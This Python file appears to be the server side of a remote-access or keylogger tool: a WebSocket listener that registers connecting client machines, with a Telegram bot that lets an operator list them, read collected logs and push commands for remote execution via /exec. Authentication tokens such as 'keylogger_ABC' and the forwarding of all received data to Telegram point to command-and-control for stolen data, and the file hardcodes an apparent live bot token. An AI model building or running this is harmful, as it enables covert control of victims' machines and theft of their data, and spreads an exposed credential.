import asyncio
import websockets
import json
import os
import telebot
import subprocess
from datetime import datetime
from collections import deque

# Telegram Bot Configuration
BOT_TOKEN = '7333847070:AAFUwJpWNvTZTQLVIsbcCicJZlWAmqFFNa4'  # Replace with your Telegram bot API token
CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"  # Replace with your Telegram chat ID
bot = telebot.TeleBot(BOT_TOKEN)

# Log file path
LOG_FILE = "logs/logs.txt"
clients = {}  # Store clients as {address: websocket}
command_history = deque(maxlen=100)  # Keeps last 100 commands

# Authentication
VALID_TOKENS = {"secure_token123", "auth_payload456", "keylogger_ABC"}

# --- File Handling ---
# Save data to a file
def save_to_file(filename, data):
    os.makedirs(os.path.dirname(filename), exist_ok=True)
    with open(filename, 'a') as file:
        file.write(data + '\n')  # Append data with a newline
    print(f"Data saved to {filename}")

# Read data from a file
def read_file(filename):
    if os.path.exists(filename):
        with open(filename, 'r') as file:
            return file.read()
    return "No data available."

# --- Telegram Bot Commands ---
# Start command
@bot.message_handler(commands=['start'])
def start_command(message):
    bot.send_message(
        message.chat.id,
        "Hello! I am your advanced server bot.\n\n"
        "Commands:\n"
        "/getlogs - View logs\n"
        "/getclients - See active clients\n"
        "/sendmessage - Send message to clients\n"
        "/exec - Execute commands remotely\n"
        "/restart - Restart server"
    )

# Get logs
@bot.message_handler(commands=['getlogs'])
def get_logs(message):
    logs = read_file(LOG_FILE)
    bot.send_message(message.chat.id, f"📜 Logs:\n{logs}")

# Get active clients
@bot.message_handler(commands=['getclients'])
def get_clients(message):
    if clients:
        client_list = "\n".join([f"{addr}" for addr in clients.keys()])
        bot.send_message(message.chat.id, f"🟢 Active Clients:\n{client_list}")
    else:
        bot.send_message(message.chat.id, "❌ No active clients connected.")

# Send a message to a specific client
@bot.message_handler(commands=['sendmessage'])
def send_message_to_client(message):
    try:
        parts = message.text.split(" ", 2)
        client_address = parts[1]
        msg_content = parts[2]

        if client_address in clients:
            asyncio.run(clients[client_address].send(json.dumps({
                "command": "message",
                "result": msg_content,
                "timestamp": str(datetime.now())
            })))
            bot.send_message(message.chat.id, f"✅ Message sent to client {client_address}")
        else:
            bot.send_message(message.chat.id, f"❌ No client found with address {client_address}")
    except IndexError:
        bot.send_message(message.chat.id, "❌ Invalid command format. Use /sendmessage client_address your_message_here")

# Execute remote commands on a client
@bot.message_handler(commands=['exec'])
def execute_command(message):
    try:
        parts = message.text.split(" ", 2)
        client_address = parts[1]
        command = parts[2]

        if client_address in clients:
            asyncio.run(clients[client_address].send(json.dumps({
                "command": "execute",
                "result": command,
                "timestamp": str(datetime.now())
            })))
            bot.send_message(message.chat.id, f"✅ Command sent to client {client_address}: {command}")
        else:
            bot.send_message(message.chat.id, f"❌ No client found with address {client_address}")
    except IndexError:
        bot.send_message(message.chat.id, "❌ Invalid command format. Use /exec client_address command_here")

# Restart the server
@bot.message_handler(commands=['restart'])
def restart_server(message):
    bot.send_message(message.chat.id, "🔄 Restarting the server...")
    os.execv(sys.executable, ['python'] + sys.argv)

# Send a message to Telegram
def send_to_telegram(data):
    bot.send_message(CHAT_ID, f"🔔 New Update: {data}")

# Run Telegram Bot
def run_bot():
    print("Telegram Bot started...")
    bot.polling()

# --- WebSocket Server ---
async def handler(websocket, path):
    clients[websocket.remote_address] = websocket
    print(f"Client connected: {websocket.remote_address}")
    send_to_telegram(f"🟢 New client connected: {websocket.remote_address}")

    # Authentication Process
    try:
        await websocket.send(json.dumps({"command": "auth", "result": "Please authenticate with your token."}))
        auth_message = await websocket.recv()
        auth_data = json.loads(auth_message)

        if auth_data.get("command") == "auth" and auth_data.get("result") in VALID_TOKENS:
            await websocket.send(json.dumps({"command": "auth", "result": "Authentication successful."}))
            print(f"Client {websocket.remote_address} authenticated successfully.")
            send_to_telegram(f"🟢 Client {websocket.remote_address} authenticated successfully.")
        else:
            await websocket.send(json.dumps({"command": "auth", "result": "Authentication failed."}))
            print(f"Client {websocket.remote_address} failed to authenticate.")
            send_to_telegram(f"❌ Client {websocket.remote_address} failed authentication.")
            return

        async for message in websocket:
            data = json.loads(message)
            formatted_data = f"Command: {data['command']}, Result: {data['result']}, Timestamp: {data['timestamp']}"
            print(f"Received: {formatted_data}")

            save_to_file(LOG_FILE, formatted_data)
            send_to_telegram(f"📩 New data received:\n{formatted_data}")

            # Add to command history
            command_history.append(formatted_data)

            # Forward the message to all connected clients
            for client in clients.values():
                if client != websocket:
                    await client.send(json.dumps(data))
    except Exception as e:
        print(f"Error with client {websocket.remote_address}: {e}")
        send_to_telegram(f"❌ Error with client {websocket.remote_address}: {e}")
    finally:
        del clients[websocket.remote_address]
        print(f"Client disconnected: {websocket.remote_address}")
        send_to_telegram(f"❌ Client disconnected: {websocket.remote_address}")

# Start WebSocket server
async def start_server():
    port = int(os.getenv("PORT", 10000))
    print(f"WebSocket Server started on ws://0.0.0.0:{port}")
    server = await websockets.serve(handler, "0.0.0.0", port)
    await server.wait_closed()

# Run everything together
if __name__ == "__main__":
    import threading
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.daemon = True
    bot_thread.start()

    asyncio.run(start_server())
